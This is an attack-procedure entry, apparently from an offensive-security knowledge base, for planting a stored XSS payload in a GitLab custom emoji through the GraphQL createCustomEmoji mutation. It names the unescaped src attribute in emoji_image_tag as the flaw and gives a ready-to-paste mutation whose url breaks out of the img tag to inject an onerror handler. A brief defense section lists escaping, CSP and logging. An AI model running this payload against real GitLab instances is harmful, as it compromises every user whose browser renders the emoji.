---
tags:
  - xss
  - graphql
  - injection
type: procedure
tools:
  - '[[tools/GraphQL-Explorer]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-custom-emoji-graphql]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.670Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: fa55edd0-d5d3-44b9-8d3d-e2a2ba0bba74
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create Malicious Custom Emoji via GraphQL

## Summary

This procedure injects a stored XSS payload into a custom emoji by creating it through GitLab's GraphQL API, exploiting the lack of src attribute escaping in the emoji rendering function.

## Description

The vulnerability originates in lib/gitlab/emoji.rb's emoji_image_tag function, which fails to escape the src attribute of the img tag. By crafting a URL like 'http://aaa#'><img onerror=alert(location) src=.>', the payload breaks out of the attribute and injects an onerror handler. This is executed when the emoji is rendered in a browser. The procedure targets self-managed GitLab instances with the custom emoji feature enabled, using the GraphQL mutation to persist the payload group-wide.

## Requirements

1. Access to GitLab's GraphQL API (e.g., via Explorer at https://localhost/-/graphql-explorer)
2. Valid authentication token or session for API calls
3. Existing group (e.g., 'xss_target') from prior setup

## Defense

Defensive measures and detection strategies:

- Sanitize and escape URL inputs in GraphQL mutations for custom emojis
- Implement content security policy (CSP) to block inline scripts
- Log and monitor GraphQL mutations for suspicious URL patterns containing script tags

## Objectives

1. Persist the XSS payload in a custom emoji resource
2. Ensure the payload evades basic validation in the API
3. Enable execution when the emoji is referenced and rendered

## Instructions

### Step 1: Access GraphQL Explorer

**Context**: Open the web-based GraphQL interface to prepare the mutation.

**Command** (UI Access):
Navigate to https://your-gitlab/-/graphql-explorer.

> Expected output: GraphQL Explorer loads with query editor.

### Step 2: Execute Creation Mutation

**Context**: Send the mutation to create the emoji with the malicious URL.

**Command** ([[commands/create-custom-emoji-graphql]]):
```graphql
mutation { createCustomEmoji(input: { groupPath: "xss_target", name:"xssreplace", url:"http://aaa#'><img onerror=alert(location) src=.>" }) { customEmoji { id name url } } }
```

> Paste into the explorer and execute. Expected output: JSON with { customEmoji: { id: '...', name: 'xssreplace', url: '...' } }.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/create-custom-emoji-graphql]]

## Tools Used

- [[tools/GraphQL-Explorer]]

## Tags

- xss
- graphql
